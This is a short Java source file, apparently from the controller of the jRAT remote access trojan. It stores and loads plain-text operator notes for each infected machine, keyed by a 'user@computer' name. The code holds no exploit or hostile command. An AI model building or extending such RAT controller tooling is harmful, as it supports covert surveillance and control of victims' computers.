package jrat.controller;

import java.io.*;

public class Notes {

	public static String load(String userAtComp) throws Exception {
		File file = new File(Globals.getNotesDirectory(), userAtComp.replace("@", "-") + ".txt");

		if (!file.exists()) {
			throw new Exception();
		}

		FileInputStream in = new FileInputStream(file);

		BufferedReader reader = new BufferedReader(new InputStreamReader(in));

		String line;
		String s = "";

		while ((line = reader.readLine()) != null) {
			s += line + "\n\r";
		}

		reader.close();

		return s;
	}

	public static void save(String note, String userAtComp) throws Exception {
		File file = new File(Globals.getNotesDirectory(), userAtComp.replace("@", "-") + ".txt");

		FileWriter writer = new FileWriter(file);
		writer.write(note);
		writer.close();
	}
}
